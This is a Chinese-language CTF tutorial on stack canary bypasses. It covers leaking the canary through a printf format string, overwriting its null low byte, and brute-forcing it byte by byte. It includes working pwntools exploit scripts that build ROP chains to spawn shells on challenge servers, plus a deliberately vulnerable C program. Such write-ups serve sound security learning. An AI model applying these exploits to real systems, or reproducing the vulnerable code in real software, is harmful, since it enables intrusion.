## Canary（金丝雀），栈溢出保护

1. canary保护是防止栈溢出的一种措施，其在调用函数时，在栈帧的上方放入一个`随机值` ，绕过canary时首先需要泄漏这个随机值，然后再钩爪ROP链时将其作为垃圾数据写入，注意要放在rbp的前面，下面调试来观察随机值：

   ![image-20240630104806257](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406301048369.png)

   1. 可以看到，在调用的函数的开头将rax作为随机值放入到了rbp上放的栈上

   ![image-20240630105026803](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406301050882.png)

   ![image-20240630105225422](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406301052502.png)

   2. 在函数的结尾，将随机值取出后，与本来的随机值做了对比，相同的才会返回，不同就会报错。

2. 在进行栈溢出时，如果程序开启了canary保护，首先就需要泄漏这个随机值，否则其被覆盖掉后，程序在退出时再检查该值，会引发错误。

### 1. 利用`printf格式化字符串` 泄漏随机值。

1. 

   1. 先确定 `随机值` 相对于 `格式化字符串` 的位置，再利用 `%n7$p` 来输出该位置的内容，然后就是常规的栈溢出ROP构造，但此时要注意将泄漏出来的 `canary` 填充再rbp位置的前面：
   1. 例题：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#bjdctf_2020_babyrop2)

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   p = remote("node5.buuoj.cn",29861)
   elf = ELF('./bjdctf_2020_babyrop2')
   #获取got、plt地址
   got = elf.got['puts']
   plt = elf.plt['puts']
   print(hex(got),hex(plt))
   
   p.recvuntil(b"I'll give u some gift to help u!\n")
   #泄漏canary
   p.sendline(b'%7$p')
   p.recvuntil(b'0x')
   canary = int(p.recv(16),16)
   print("canary:",hex(canary))
   
   #获取传参地址
   pop_rdi_ret = 0x0000000000400993
   #获取返回地址，便于下一次利用栈溢出
   main_addr = 0x400887
   print(hex(main_addr))
   ret = 0x00000000004005f9
   
   #构造payload，获得puts函数的地址，注意绕过canary，在rbp前面填充canary，计算canary前后填充的垃圾数据
   payload = b'a'*(0x18)+p64(canary)+b'a'*8+p64(pop_rdi_ret)+p64(got)+p64(plt)+p64(main_addr)
   p.sendline(payload)
   p.recvuntil(b'Pull up your sword and tell me u story!\n')
   addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   print(hex(addr))
   libc = LibcSearcher('puts',addr)
   libc_base = addr - libc.dump('puts')
   sys_addr = libc_base + libc.dump('system')
   str_bin = libc_base + libc.dump('str_bin_sh')
   print(hex(libc_base),hex(sys_addr),hex(str_bin))
   
   p.recvuntil(b'Pull up your sword and tell me u story!\n')
   #第二次利用栈溢出
   payload = b'a'*(0x18)+p64(canary)+b'a'*8+p64(ret)+p64(pop_rdi_ret)+p64(str_bin)+p64(sys_addr)+p64(main_addr)
   p.sendline(payload)
   #p.sendline(b'cat flag')
   # 与远程交互
   p.interactive()
   
   
   ```

   

### 2. 覆盖截断字符获取canary

1. Canry的最底一个字节设计为b'\x00'，是为了防止put，write，printf登将canary读出。如果利用栈溢出将最低位的b'\x00'覆盖，就可以利用答应函数将canary一致输出，最后再在最低位拼接上 `b'\x00'`就可以得到canary。

2. 实例：

   ```c++
   // test.c
   #include <stdio.h>
   #include <unistd.h>
   #include <stdlib.h>
   #include <string.h>
   void getshell(void) {
       system("/bin/sh");
   }
   void init() {
       setbuf(stdin, NULL);
       setbuf(stdout, NULL);
       setbuf(stderr, NULL);
   }
   void vuln() {
       char buf[100];
       for(int i=0;i<2;i++){
           read(0, buf, 0x200);
           printf(buf);
       }
   }
   int main(void) {
       init();
       puts("Hello Hacker!");
       vuln();
       return 0;
   }
   
   ```

3. 覆盖canary的最后一个字节，并从新组成canary：

   1. 首先确定要覆盖的位置，由于是 `小端序` 所以最后一个字节在高位，找到canary的偏移 `var_c` 后于 `buf` 相减再加一就可以指向canary的最低字节处，将其覆盖位a（注意使用send发送，不要最后的 `回车符` ）接受返会后要 `拼接canary`。

      ![image-20240630204202081](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406302042156.png)

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   p = process("./test")
   p.recvuntil(b'Hello Hacker!\n')
   #发送var_c-buf+1个 b'a'，最后一个a可以覆盖掉canary的最低字节 b`\x00`
   payload = b'a'*(0x70-0xc+1)
   p.send(payload)
   #接受返回后从行拼接canary
   canary = p.recv()[0x65:0x68]
   canary = canary.rjust(4,b'\x00')
   print(hex(u32(canary)))
   ```

   4. 再利用canary绕过金丝雀。

      ```python
      shell = 0x080491B6
      #canary后面还有0xc个字节才到返回地址，而不是仅查一个ebp(4个字节)
      payload = b'a'*(0x70-0xc)+canary+b'a'*(0x8+4)+p32(shell)
      p.sendline(payload)
      # 与远程交互
      p.interactive()
      ```



### 3. 逐字节爆破

题目地址：[pwn](https://www.ctf.show/challenges#pwn54-4064)

注意：canary爆破时，利用栈溢出，溢出到canary位置，从**低位到高位** 逐次覆盖掉canary的4个字节(一位无法绕过低位字节堆高位进行爆破，所以必须从低到高)，且要求canary不能变化，绕过重开程序canary变化，就不适用爆破了。

1. 函数的主逻辑在ctfshow，前面的函数基本无用，ctfshow中存在栈溢出：

   ![image-20240706175916809](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407061759907.png)
   
2. 爆破脚本：

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   
   for i in range(0xff):
       p = remote("pwn.challenge.ctf.show",28104)
       p.recvuntil(b"How many bytes do you want to write to the buffer?\n>")
       p.sendline(b'100')
       p.recv()
       payload = b'a'*(32)+int.to_bytes(i)
       p.send(payload)
       data = p.recv()
       if b"Canary Value Incorrect!\n" not in  data:
           canary = data
           print(canary,i)
           break
   
   ```

   第一次爆破出来是：

   ![image-20240706183936688](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407061839809.png)

   下面爆破第二个：

   ```python
   from pwn import *
   
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   
   for i in range(0xff):
       p = remote("pwn.challenge.ctf.show",28104)
       # p = process('./pwn')
       # elf = ELF('./pwn')
       p.recvuntil(b"How many bytes do you want to write to the buffer?\n>")
       p.sendline(b'100')
       p.recv()
       payload = b'a'*(32)+int.to_bytes(51)+int.to_bytes(i)
       p.send(payload)
       data = p.recv()
       if b"flag" in  data:
           canary = data
           print(canary,i)
           break
   
   ```

   ![image-20240706184045278](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407061840390.png)

   第三个：

   ```python
   from pwn import *
   
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   
   for i in range(0xff):
       p = remote("pwn.challenge.ctf.show",28104)
       # p = process('./pwn')
       # elf = ELF('./pwn')
       p.recvuntil(b"How many bytes do you want to write to the buffer?\n>")
       p.sendline(b'100')
       p.recv()
       payload = b'a'*(32)+int.to_bytes(51)+int.to_bytes(54)+int.to_bytes(i)
       p.send(payload)
       data = p.recv()
       if b"flag" in  data:
           canary = data
           print(canary,i)
           break
   ```

   ![image-20240706184250681](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407061842776.png)

   第四个：

   ```python
   from pwn import *
   
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   
   for i in range(0xff):
       p = remote("pwn.challenge.ctf.show",28104)
       p.recvuntil(b"How many bytes do you want to write to the buffer?\n>")
       p.sendline(b'100')
       p.recv()
       payload = b'a'*(32)+int.to_bytes(51)+int.to_bytes(54)+int.to_bytes(68)+int.to_bytes(i)
       p.send(payload)
       data = p.recv()
       if b"flag" in  data:
           canary = data
           print(canary,i)
           break
   ```

   ![image-20240706184354494](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407061843593.png)

3. 所以最后canary确定为0x21443633。注意大小端序，最后验证爆破的canary:

   ```python
   from pwn import *
   
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   
   p = remote("pwn.challenge.ctf.show",28104)
   p.recvuntil(b"How many bytes do you want to write to the buffer?\n>")
   p.sendline(b'100')
   p.recv()
   payload = b'a'*(32)+p32(0x21443633)+b'a'*(0xc+4)+p32(0x08048696)
   p.send(payload)
   p.recv()
   p.interactive()
   
   ```

   ![image-20240706184952360](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407061849491.png)

